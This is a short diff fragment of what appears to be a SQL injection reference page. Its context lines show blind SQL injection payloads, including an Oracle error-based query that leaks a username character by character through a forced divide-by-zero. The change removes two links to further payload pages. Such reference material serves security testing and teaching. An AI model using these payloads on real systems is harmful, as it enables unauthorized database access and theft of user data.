@@ -403,7 +403,3 @@ SELECT IF((SELECT LENGTH(COLUMN_NAME) FROM (SELECT COLUMN_NAME FROM (SELECT (@ro
 ```sql
 (SELECT CASE WHEN SUBSTR((SELECT USERNAME FROM (SELECT ROWNUM RN, USERNAME FROM USERS) WHERE RN=1),1,1)='A' THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)
 ```
-
-[Payload syntaxes](https://www.notion.so/Payload-syntaxes-7d1a9ea1ba584b689f40210d2401e8a6?pvs=21)
-
-[Time-based discovery payloads](https://www.notion.so/Time-based-discovery-payloads-5c41991ce9774215abce9ed8f50c1fb8?pvs=21)
